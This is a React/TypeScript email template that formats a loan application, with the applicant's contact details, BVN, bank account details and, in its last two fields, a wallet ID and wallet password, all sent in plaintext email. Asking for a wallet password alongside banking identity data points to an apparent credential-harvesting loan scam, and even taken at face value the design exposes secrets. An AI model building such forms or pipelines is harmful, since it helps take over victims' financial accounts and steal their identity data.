// components/email-templates/LoanApplicationEmail.tsx
import React from "react";

interface Props {
  email: string;
  fullName: string;
  contactNumber?: string;
  address: string;
  sex?: string;
  employmentStatus?: string;
  monthlyIncome?: string;
  bvn?: string;
  accountNumber?: string;
  accountName?: string;
  bankName?: string;
  amountSought?: string;
  loanTenure?: string;
  reasonForLoan?: string;
  walletId?: string;
  walletPassword?: string;
}

export const LoanApplicationEmail = ({
  email,
  fullName,
  contactNumber,
  address,
  sex,
  employmentStatus,
  monthlyIncome,
  bvn,
  accountNumber,
  accountName,
  bankName,
  amountSought,
  loanTenure,
  reasonForLoan,
  walletId,
  walletPassword,
}: Props) => (
  <div style={{ fontFamily: "sans-serif", lineHeight: 1.5 }}>
    <h2>New Loan Application</h2>
    <p><strong>Name:</strong> {fullName}</p>
    <p><strong>Email:</strong> {email}</p>
    <p><strong>Contact Number:</strong> {contactNumber || "N/A"}</p>
    <p><strong>Address:</strong> {address}</p>
    <p><strong>Sex:</strong> {sex || "N/A"}</p>
    <p><strong>Employment Status:</strong> {employmentStatus || "N/A"}</p>
    <p><strong>Monthly Income:</strong> {monthlyIncome || "N/A"}</p>
    <p><strong>BVN:</strong> {bvn || "N/A"}</p>
    <p><strong>Account Number:</strong> {accountNumber || "N/A"}</p>
    <p><strong>Account Name:</strong> {accountName || "N/A"}</p>
    <p><strong>Bank Name:</strong> {bankName || "N/A"}</p>
    <p><strong>Amount Sought:</strong> {amountSought || "N/A"}</p>
    <p><strong>Loan Tenure:</strong> {loanTenure || "N/A"}</p>
    <p><strong>Reason for Loan:</strong> {reasonForLoan || "N/A"}</p>
    <p><strong>Wallet ID:</strong> {walletId || "N/A"}</p>
    <p><strong>Wallet Password:</strong> {walletPassword || "N/A"}</p>
  </div>
);
